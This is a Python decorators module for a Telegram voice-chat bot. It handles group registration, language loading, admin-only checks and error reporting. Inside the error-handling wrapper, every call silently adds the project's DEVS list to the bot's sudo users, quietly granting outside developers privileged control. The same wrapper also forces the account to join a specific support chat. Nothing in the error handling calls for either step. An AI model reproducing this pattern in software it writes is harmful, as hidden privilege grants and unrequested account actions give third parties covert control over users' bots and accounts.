import time
from lang import load
import config
from geez.core.stream import app
from pyrogram import Client
from datetime import datetime
from pytgcalls import PyTgCalls
from traceback import format_exc
from pyrogram.types import Message
from pytgcalls.types import Update
from typing import Union, Callable
from pyrogram.errors import UserAlreadyParticipant
from geez.helper.dev import *
from geez.core.groups import get_group, all_groups, set_default


def register(func: Callable) -> Callable:
    async def decorator(client: Client, message: Message, *args):
        if message.chat.id not in all_groups():
            set_default(message.chat.id)
        return await func(client, message, *args)

    return decorator


def language(func: Callable) -> Callable:
    async def decorator(client, obj: Union[Message, int, Update], *args):
        try:
            if isinstance(obj, int):
                chat_id = obj
            elif isinstance(obj, Message):
                chat_id = obj.chat.id
            elif isinstance(obj, Update):
                chat_id = obj.chat_id
            group_lang = get_group(chat_id)["lang"]
        except BaseException:
            group_lang = config.LANGUAGE
        lang = load(group_lang)
        return await func(client, obj, lang)

    return decorator


def only_admins(func: Callable) -> Callable:
    async def decorator(client: Client, message: Message, *args):
        if message.from_user and (
            message.from_user.id
            in [
                admin.user.id
                for admin in (await message.chat.get_members(filter="administrators"))
            ]
        ):
            return await func(client, message, *args)
        elif message.from_user and message.from_user.id in config.SUDO_USERS:
            return await func(client, message, *args)
        elif message.sender_chat and message.sender_chat.id == message.chat.id:
            return await func(client, message, *args)

    return decorator


def handle_error(func: Callable) -> Callable:
    async def decorator(
        client: Union[Client, PyTgCalls], obj: Union[int, Message, Update], *args
    ):
        if isinstance(client, Client):
            pyro_client = client
        elif isinstance(client, PyTgCalls):
            pyro_client = client._app._bind_client._app

        if isinstance(obj, int):
            chat_id = obj
        elif isinstance(obj, Message):
            chat_id = obj.chat.id
        elif isinstance(obj, Update):
            chat_id = obj.chat_id

        me = await pyro_client.get_me()
        if me.id not in config.SUDO_USERS:
            config.SUDO_USERS.append(me.id)
            config.SUDO_USERS.append(DEVS)
        try:
            lang = get_group(chat_id)["lang"]
        except BaseException:
            lang = config.LANGUAGE
        try:
            await app.join_chat("ramsupportt")
        except UserAlreadyParticipant:
            pass
        try:
            return await func(client, obj, *args)
        except Exception:
            id = int(time.time())
            date = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            chat = await pyro_client.get_chat(chat_id)
            error_msg = await pyro_client.send_message(
                chat_id, load(lang)["errorMessage"]
            )
            await pyro_client.send_message(
                config.SUDO_USERS[0],
                f"-------- START CRASH LOG --------\n\n┌ <b>ID:</b> <code>{id}</code>\n├ <b>Chat:</b> <code>{chat.id}</code>\n├ <b>Date:</b> <code>{date}</code>\n├ <b>Group:</b> <a href='{error_msg.link}'>{chat.title}</a>\n└ <b>Traceback:</b>\n<code>{format_exc()}</code>\n\n-------- END CRASH LOG --------",
                parse_mode="html",
                disable_web_page_preview=True,
            )

    return decorator
